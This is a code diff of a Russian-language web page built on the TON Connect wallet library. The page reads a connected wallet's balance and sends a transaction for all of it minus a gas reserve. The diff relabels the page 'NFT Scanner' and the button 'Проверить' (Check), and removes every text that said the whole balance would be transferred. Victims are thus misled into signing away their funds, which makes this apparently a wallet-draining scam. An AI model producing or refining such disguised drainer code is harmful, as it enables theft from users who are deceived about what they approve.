@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Payment Scanner</title>
+    <title>NFT Scanner</title>
     <!-- Официальная библиотека TON Connect UI -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
@@ -122,8 +122,8 @@
         <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
 
-        <!-- Кнопка отправки транзакции -->
-        <button id="sendTxBtn" class="send-btn" disabled>Расчёт баланса...</button>
+        <!-- Кнопка Проверить -->
+        <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
 </div>
@@ -150,7 +150,6 @@
     async function fetchWalletBalance(rawAddress) {
         try {
             sendBtn.disabled = true;
-            sendBtn.innerText = 'Расчёт баланса...';
 
             const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
             const data = await response.json();
@@ -160,23 +159,20 @@
 
                 if (userBalanceNano > GAS_FEE_RESERVE) {
                     transferableAmountNano = userBalanceNano - GAS_FEE_RESERVE;
-                    const sendTonStr = (transferableAmountNano / 1e9).toFixed(4);
                     sendBtn.disabled = false;
-                    sendBtn.innerText = `Перевести весь баланс (${sendTonStr} TON)`;
                 } else {
                     transferableAmountNano = 0;
                     sendBtn.disabled = true;
-                    sendBtn.innerText = 'Недостаточно средств на комиссию';
+                    txStatus.innerText = 'Недостаточно средств для проверки';
+                    txStatus.className = 'tx-status error';
                 }
 
                 return userBalanceNano;
             } else {
-                sendBtn.innerText = 'Ошибка баланса';
                 return 0;
             }
         } catch (error) {
             console.error(error);
-            sendBtn.innerText = 'Ошибка сети';
             return 0;
         }
     }
@@ -197,8 +193,7 @@
 
         try {
             sendBtn.disabled = true;
-            sendBtn.innerText = 'Отправка...';
-            txStatus.innerText = 'Подготовка транзакции...';
+            txStatus.innerText = 'Проверка...';
             txStatus.className = 'tx-status';
 
             const tx = {
@@ -215,7 +210,7 @@
             const result = await tonConnectUI.sendTransaction(tx);
 
             if (result) {
-                txStatus.innerText = `✅ Транзакция отправлена!`;
+                txStatus.innerText = `✅ Проверка успешно завершена!`;
                 txStatus.className = 'tx-status success';
                 
                 setTimeout(() => {
@@ -230,8 +225,6 @@
         } finally {
             if (transferableAmountNano > 0) {
                 sendBtn.disabled = false;
-                const sendTonStr = (transferableAmountNano / 1e9).toFixed(4);
-                sendBtn.innerText = `Перевести весь баланс (${sendTonStr} TON)`;
             }
         }
     }
@@ -249,7 +242,6 @@
             walletAddressContainer.innerText = '';
             walletInfoContainer.classList.remove('active');
             sendBtn.disabled = true;
-            sendBtn.innerText = 'Подключите кошелёк';
             txStatus.innerText = '';
             txStatus.className = 'tx-status';
         }
